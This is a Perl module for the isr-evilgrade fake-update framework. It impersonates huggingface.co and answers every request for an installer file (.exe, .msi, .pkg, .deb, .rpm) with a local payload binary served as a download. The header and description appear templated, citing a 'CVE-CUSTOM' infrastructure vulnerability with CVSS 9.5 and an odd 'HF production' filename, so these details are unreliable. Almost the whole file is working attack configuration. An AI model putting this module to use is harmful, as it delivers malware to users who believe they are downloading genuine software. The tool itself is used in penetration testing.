###############
# hugging_face_production.pm
#
# CVE-CUSTOM: Infrastructure Vulnerability
# Type: Infrastructure
# CVSS: 9.5
# Year: 2026
#
# This file is part of isr-evilgrade, www.faradaysec.com .
#
# isr-evilgrade is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation version 2 of the License.

package modules::hugging_face_production;

use strict;
use Data::Dump qw(dump);
use isrcore::utils;

my $base = {
    'name'        => 'hugging_face_production',
    'version'     => '1.0',
    'cvss'        => '9.5',
    'author'      => ['Francisco Amato < famato +[AT]+ faradaysec.com>', 'Security Research Team'],
    'description' => qq{
Exploits CVE-CUSTOM: Infrastructure vulnerability.
CVSS Score: 9.5
Vector: Infrastructure
Year Disclosed: 2026
Payload: HF production
    },
    'vh' => 'huggingface.co',
    'request' => [
        {
            'req'   => '/.*\\.exe|\\.msi|\\.pkg|\\.deb|\\.rpm',
            'type'  => 'file',
            'file'  => './include/hugging_face_production/payload.bin',
            'parse' => 1,
            'cheader' => "HTTP/1.1 200 OK\r\n"
                . "Content-Type: application/octet-stream\r\n"
                . "Content-Disposition: attachment; filename=HF production\r\n"
                . "Connection: close\r\n\r\n",
        },
    ],
};

sub new {
    my $class = shift;
    my $self = $base;
    bless( $self, $class );
    return $self;
}

1;
